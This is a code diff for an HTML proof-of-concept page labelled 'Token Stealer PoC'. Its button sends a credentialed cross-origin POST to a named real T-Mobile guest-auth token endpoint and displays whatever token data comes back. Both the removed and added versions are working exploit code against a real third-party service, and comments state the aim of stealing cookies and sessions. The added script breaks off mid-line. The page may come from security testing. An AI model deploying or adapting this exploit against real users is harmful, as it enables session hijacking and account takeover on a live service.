@@ -1,34 +1,67 @@
-<script>
-    async function stealToken() {
-        const url = "https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens";
-        const log = document.getElementById('log');
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Fermionic Plants - Exploit PoC</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #0b0e11; color: #e1e1e1; padding: 20px; }
+        .wrapper { max-width: 850px; margin: auto; }
+        .card { background: #1c2128; border: 1px solid #444c56; border-radius: 8px; padding: 25px; margin-bottom: 20px; border-top: 5px solid #e20074; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        h1 { color: #e20074; margin: 0 0 15px 0; font-size: 1.6rem; }
+        p { color: #8b949e; font-size: 0.9rem; margin-bottom: 20px; }
         
-        log.innerHTML = "[*] Initiating Credentialed CORS Attack...\n";
+        .status-box { background: #0d1117; border: 1px solid #30363d; padding: 20px; border-radius: 5px; font-family: 'Consolas', monospace; min-height: 200px; }
+        .btn-exploit { background: #e20074; color: white; border: none; padding: 18px; width: 100%; border-radius: 5px; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 1.1rem; transition: 0.3s; }
+        .btn-exploit:hover { background: #ff0084; box-shadow: 0 0 15px #e20074; }
+        
+        .success-text { color: #39d353; font-weight: bold; display: block; margin-bottom: 10px; }
+        .fail-text { color: #f85149; }
+        .raw-data { background: #161b22; padding: 15px; border: 1px solid #444c56; margin-top: 15px; word-break: break-all; color: #c9d1d9; font-size: 12px; display: block; }
+    </style>
+</head>
+<body>
+
+<div class="wrapper">
+    <div class="card">
+        <h1>Fermionic Plants - Token Stealer PoC</h1>
+        <p>Target: <code>https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens</code></p>
+        
+        <button class="btn-exploit" onclick="runExploit()">Execute Credentialed Attack</button>
+    </div>
+
+    <div class="card">
+        <h3 style="margin-top:0; font-size: 1rem; color: #8b949e;">Exploit Console Output:</h3>
+        <div id="status-box" class="status-box">
+            [+] Awaiting Command...
+        </div>
+    </div>
+</div>
+
+<script>
+    async function runExploit() {
+        const url = "https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens";
+        const consoleBox = document.getElementById('status-box');
+        
+        consoleBox.innerHTML = "[*] Launching exploit...<br>[*] Origin: " + window.location.origin + "<br>";
 
         try {
+            // We use POST because your Burp log indicated POST/OPTIONS
             const response = await fetch(url, {
                 method: 'POST',
                 mode: 'cors',
-                credentials: 'include', // This is the key!
+                credentials: 'include', // CRITICAL: This attempts to steal cookies/sessions
                 headers: {
                     'Content-Type': 'application/json',
-                    'applicationid': 'RECON-TEST', // From your Burp headers
-                    'channelid': 'WEB'
+                    'Accept': 'application/json',
+                    'applicationid': 'TMO-RECON' // Custom header identified in your log
                 },
                 body: JSON.stringify({})
             });
 
-            const data = await response.text();
-            
-            if (response.ok) {
-                log.innerHTML += `<span style="color:#00ff00; font-weight:bold;">[!!!] SUCCESS: SESSION TOKEN STOLEN [!!!]</span>\n`;
-                log.innerHTML += `<div class="data-out">${data}</div>`;
-                console.log("Stolen Data:", data);
-            } else {
-                log.innerHTML += `[-] Server responded with status: ${response.status}\n`;
-            }
-        } catch (e) {
-            log.innerHTML += `<span style="color:#ff0000;">[!] Execution Blocked: ${e.message}</span>\n`;
-        }
-    }
-</script>
+            const acao = response.headers.get('Access-Control-Allow-Origin');
+            const acac = response.headers.get('Access-Control-Allow-Credentials');
+            const responseData = await response.text();
+
+            consoleBox.innerHTML += `[+] Response Status: ${response.status}<br>`;
+            consoleBox.innerHTML += `[+] ACAO: ${acao || 'None'}<br>`;
+            consoleBox.innerHTML += `[+] ACAC: ${acac || 'None'}<br><br
